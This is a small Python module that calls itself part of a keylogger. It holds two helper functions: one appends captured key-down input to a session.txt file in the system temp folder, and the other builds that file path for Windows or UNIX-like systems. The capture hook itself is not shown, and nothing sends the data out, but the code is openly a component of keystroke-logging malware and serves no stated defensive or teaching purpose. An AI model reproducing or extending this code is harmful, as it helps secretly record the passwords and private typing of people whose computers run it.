###  FUNCTIONS TO BE PULLED IN WHEN KEYLOGGER.main() IS RAN  ###
#### modules pulled into the session ###
import os


##   function to be called on keyEvent.KEY_DOWN events, writes the keyboard input to 
###   file in the temp folder. 

def outTxt(var):
    keyboardInput = var
    with open('{}'.format(workingDir()), 'a') as output:
        output.write(var)
        
        
##   function to define the path of the temp folder, as well as 
###   the OS of the host's machine, as to play into Windows/UNIX-like naming conventions.
####   adds keyboard input to the session.txt file.

def workingDir():
    path = os.environ.get('TEMP')
    if 'Windows' in os.environ.get('OS'):
        return path + '\session.txt'
    else:
        return path + '/session.txt'
